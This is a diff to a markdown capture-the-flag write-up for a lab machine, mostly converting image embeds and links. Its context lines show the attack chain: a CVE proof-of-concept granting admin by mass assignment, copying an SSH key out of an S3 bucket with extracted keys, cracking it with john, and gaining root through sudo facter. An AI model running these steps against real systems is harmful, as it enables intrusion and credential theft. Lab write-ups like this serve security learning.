@@ -27,7 +27,7 @@ python3 cve-2025-2304-poc.py http://MACHINE_IP -u low_user -p Password123
 The script sends a crafted POST request to `/admin/users/[ID]/updated_ajax`. Because the backend uses `permit!`, sending `user[role]=admin` overrides the database entry for our session, granting us full Administrative access to the CMS dashboard.
 
 
-![[../Attachements/Pasted image 20260201211310.png]]
+![../Attachements/Pasted image 20260201211310.png](<../Attachements/Pasted image 20260201211310.png>)
 
 ---
 
@@ -37,13 +37,13 @@ Once logged into the CMS as an **Administrator**, we navigate to the **Media Set
 
 **Extracted Credentials:**
 
-- **Endpoint:** `http://MACHINE_IP:54321`
+- **Endpoint:** `[](http://MACHINE_IP:54321)`
     
 - **Access Key:** `AKIA...`
     
 - **Secret Key:** `WJalr...`
 
-![[../Attachements/Screenshot 2026-02-01 210439.png]]
+![../Attachements/Screenshot 2026-02-01 210439.png](<../Attachements/Screenshot 2026-02-01 210439.png>)
 
 Using the `aws-cli`, we list the available buckets:
 
@@ -53,9 +53,9 @@ Bash
 aws --endpoint-url http://MACHINE_IP:54321 s3 ls --profile facts_admin
 ```
 
-- `s3://randomfacts` (Publicly accessible media)
+- `[](s3://randomfacts)` (Publicly accessible media)
     
-- `s3://internal` (Sensitive system backups)
+- `[](s3://internal)` (Sensitive system backups)
     
 
 ---
@@ -76,8 +76,6 @@ aws --endpoint-url http://MACHINE_IP:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 
 The SSH key is encrypted and requires a passphrase. We use `ssh2john` to format the key for cracking and then run `john` with the `rockyou.txt` wordlist.
 
-Bash
-
 ```
 # Convert key to a crackable hash
 ssh2john id_ed25519 > id_ed25519.hash
@@ -86,7 +84,7 @@ ssh2john id_ed25519 > id_ed25519.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
 ```
 
-![[../Attachements/Screenshot 2026-02-01 210510.png]]
+![../Attachements/Screenshot 2026-02-01 210510.png](<../Attachements/Screenshot 2026-02-01 210510.png>)
 `**
 
 ### Step 3: Establishing SSH
@@ -130,11 +128,5 @@ sudo /usr/bin/facter --custom-dir /tmp root_me
 /bin/bash -p
 ```
 
-![[../Attachements/Screenshot 2026-02-01 205316.png]]
+![../Attachements/Screenshot 2026-02-01 205316.png](<../Attachements/Screenshot 2026-02-01 205316.png>)
 ---
-
-
-
-
-
-
